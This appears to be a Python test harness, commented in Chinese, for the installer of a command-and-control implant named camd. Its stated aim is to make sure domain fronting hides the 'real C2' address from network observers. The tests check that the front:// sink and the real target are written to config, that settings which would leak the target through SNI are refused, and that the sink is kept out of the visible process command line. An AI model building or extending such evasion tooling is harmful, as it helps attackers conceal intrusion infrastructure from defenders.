#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""一键部署脚本 front:// 出口接线守卫。

背景：域前置（front://）是回传的核心能力——链路上只能看到前置域，
真实目标藏在内层 HTTP 的 Host 里。但能力做出来不等于能用：一键脚本
若没接线，目标机部署下去仍是裸 tcp://，真实 C2 直接暴露。

覆盖三组失效：
  1. 接线缺失/退化：front 模式没产出 front:// sink、参数没传进 camd
  2. 引号缺陷回归：CAMD_EXTRA 含空格，conf 里不加引号会被 source 成
     "临时环境变量 + 执行命令"，参数静默丢失（实测踩出来的缺陷）
  3. 静默发散：有人在 run.sh 或试运行里另写一份 sink 拼装

每组都配反向注入，不做就不能证明断言不是恒绿。
"""
import os
import re
import shutil
import subprocess
import sys


def _default_name(tpl):
    m = re.search(r'^NAME="\$\{NAME:-([^}]+)\}"',
                  open(tpl, encoding="utf-8").read(), re.M)
    if not m:
        raise SystemExit("[FATAL] 无法从模板解析默认 NAME——"
                         "守卫会按旧名找落点，失配方向是假阴性（恒绿）")
    return m.group(1)



HERE = os.path.dirname(os.path.abspath(__file__))
MOD = os.path.dirname(HERE)
REPO = os.path.dirname(MOD)
TEMPLATE = os.path.join(MOD, "onekey.sh")
DEFN = _default_name(TEMPLATE)
GEN = os.path.join(MOD, "make_onekey.py")
CAMD = os.path.join(REPO, "agent_windows", "build", "linux", "camd")
CA = os.path.join(REPO, "25_tls", "tests", "data", "ca.pem")

# 守卫自带隔离根，不写真实 /etc。
# 旧实现读真实根 /etc/<name>/<name>.conf，两种场景都是错的：
#   单独跑  ：把部署真装进真实 /etc 再读它，污染宿主（12 pass 是脏出来的）；
#   回归里  ：onekey.sh 因 DAYNANJING_REGRESSION 自动切假根，真实根读不到，
#             conf='' 令 ①-⑦ 全 FAIL（实测 5 pass / 7 fail，SEQ:68 抓到）。
# 显式 --prefix 优先级最高，不会再触发自动假根，两种场景行为一致。
ROOT = "/data/vof/root"
CONF = "%s/etc/%s/%s.conf" % (ROOT, DEFN, DEFN)
CA_DST = "%s/etc/%s/ca.pem" % (ROOT, DEFN)

PASS = 0
FAIL = 0
path_onekey = ""


def check(cond, name, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[PASS] " + name)
    else:
        FAIL += 1
        print("[FAIL] " + name + (("  -- " + detail) if detail else ""))


def gen_script(path):
    r = subprocess.run([sys.executable, GEN, "amd64=" + CAMD, "-o", path],
                       capture_output=True, text=True, cwd=MOD)
    return r.returncode == 0, r.stdout + r.stderr


def install(args):
    # 显式 --prefix：本守卫自带隔离根，既不污染真实 /etc，也不会被
    # 回归上下文的自动假根改道（两者都会让 conf 读不到或读到脏值）。
    r = subprocess.run(["sh", path_onekey, "install",
                        "--prefix", ROOT] + args,
                       capture_output=True, text=True, cwd=MOD)
    return r.returncode, r.stdout + r.stderr


def read_conf():
    try:
        with open(CONF) as f:
            return f.read()
    except OSError:
        return ""


def cleanup():
    # 卸载必须带同一个 --prefix，否则卸的是真实根，留下假根里的落点。
    subprocess.run(["sh", path_onekey, "uninstall", "--prefix", ROOT],
                   capture_output=True, text=True, cwd=MOD)


def main():
    global path_onekey
    tmpd = "/data/vof"
    shutil.rmtree(tmpd, ignore_errors=True)
    os.makedirs(tmpd, exist_ok=True)
    path_onekey = os.path.join(tmpd, "onekey.sh")

    for p in (TEMPLATE, GEN, CAMD, CA):
        if not os.path.exists(p):
            print("[FATAL] 前置产物缺失: " + p)
            return 1

    ok, out = gen_script(path_onekey)
    if not ok:
        print("[FATAL] 生成一键脚本失败\n" + out)
        return 1

    print("=== 正向：front 模式接线 ===")
    cleanup()
    rc, out = install(["--c2", "front.test:443",
                       "--front-host", "c2.real.example",
                       "--ca", CA, "--backend", "mock"])
    conf = read_conf()
    # conf 里 sink_lines 用 printf 'CAMD_SINK="front://%s"' 写成**带引号**的
    # 标量，断言必须含引号——按无引号匹配会假失败（实测踩到：行为是对的）。
    check('CAMD_SINK="front://front.test:443"' in conf,
          "① front 模式产出 front:// sink（真实目标不在线路上）",
          "conf=" + repr(conf[:200]))
    # CAMD_EXTRA 已废弃：多词拼接会被 conf 的 `. ` source 解析成"临时环境
    # 变量 + 执行命令"，参数静默丢失。改成分立标量 CAMD_FRONT_HOST / CAMD_CA。
    check('CAMD_FRONT_HOST="c2.real.example"' in conf,
          "② 真实目标写进 CAMD_FRONT_HOST（内层 Host）")
    check('CAMD_CA="' in conf and "ca.pem" in conf,
          "③ 信任库路径写进 CAMD_CA（否则退化成不校验）")
    check('CAMD_FRONT_HOST="' in conf and 'CAMD_CA="' in conf,
          "④ 落点参数为带引号标量（防 source 时被当成命令执行）",
          "实测缺陷：无引号时参数静默丢失")
    check(os.path.exists(CA_DST), "⑤ CA 已投递到目标机", "期望落点 " + CA_DST)

    print("=== 正向：tcp 模式回归（不得被 front 改动破坏） ===")
    cleanup()
    rc, out = install(["--c2", "127.0.0.1:19999", "--backend", "mock"])
    conf = read_conf()
    check('CAMD_SINK="tcp://127.0.0.1:19999"' in conf,
          "⑥ tcp 模式仍产出 tcp:// sink")
    check(re.search(r"^CAMD_FRONT_HOST=\s*$", conf, re.M) is not None
          and re.search(r"^CAMD_CA=\s*$", conf, re.M) is not None,
          "⑦ tcp 模式 CAMD_FRONT_HOST/CAMD_CA 为空（不残留 front 参数）")

    print("=== 反向：两条守卫必须拒绝 ===")
    cleanup()
    rc, out = install(["--c2", "front.test:443",
                       "--front-host", "front.test",
                       "--ca", CA, "--backend", "mock"])
    check("不得与" in out and "相同" in out,
          "R1 front-host 与前置域相同必须拒绝（SNI 会暴露真实目标）",
          "out=" + out[-200:])

    cleanup()
    rc, out = install(["--c2", "front.test:443",
                       "--front-host", "c2.real.example", "--backend", "mock"])
    check("必须用 --ca" in out,
          "R2 front 模式缺 CA 必须拒绝（否则退化成不校验）",
          "out=" + out[-200:])

    print("=== 静态：sink 只能有一个产地 ===")
    src = open(TEMPLATE).read()
    # sink_lines 函数体内允许出现 tcp:// / front://，其它地方不得再拼装
    # 精确判据：每一处 --sink 的实参都必须是 $CAMD_SINK 变量引用。
    # 用字符串匹配 tcp:// 会误报——历史注释里满是 tcp://（说明为何必须带前缀）。
    # 只扫非注释行：注释里大量引用历史缺陷的形态（含硬编码地址），
    # 那是说明文字，不是会被执行的代码。
    code = "\n".join(l for l in src.split("\n") if not l.lstrip().startswith("#"))
    # run.sh 由**双引号 heredoc**生成，模板里必须写 \$CAMD_SINK 才能让它
    # 在运行期展开。判据看的是"生成后的语义"，故先把 \$ 归一化为 $ ——
    # 否则 run.sh 这个消费点会因首个字符是反斜杠而被下面的字符类排除，
    # 实测漏计成 1 处，S2 恒红（模板其实是对的）。
    norm = code.replace("\\$", "$")
    args = re.findall(r'--sink\s+"?([^"\\s]+)', norm)
    bad = [a for a in args if a != "$CAMD_SINK"]
    # sink 已退出命令行（/proc/<pid>/cmdline 0444 世界可读），故 args 必须为 0。
    # 旧判据要求"至少两处消费点"，重构后必然失败——判据过期，不是产品缺陷；
    # 不得为了凑数把 --sink 写回命令行。
    check(not args,
          "S1 sink 不得出现在命令行（改由 CAMD_SINK 环境注入）",
          "越界实参: " + repr(args))
    check(code.count("set -a") >= 2,
          "S2 落点参数经环境注入（run.sh 与试运行均 set -a 源 conf）",
          "实测 set -a=%d" % code.count("set -a"))
    check("sink_lines()" in src and src.count("sink_lines") >= 2,
          "S3 sink_lines 被定义且被调用（单一产地）")

    cleanup()
    print("=== 结果: %d pass, %d fail ===" % (PASS, FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
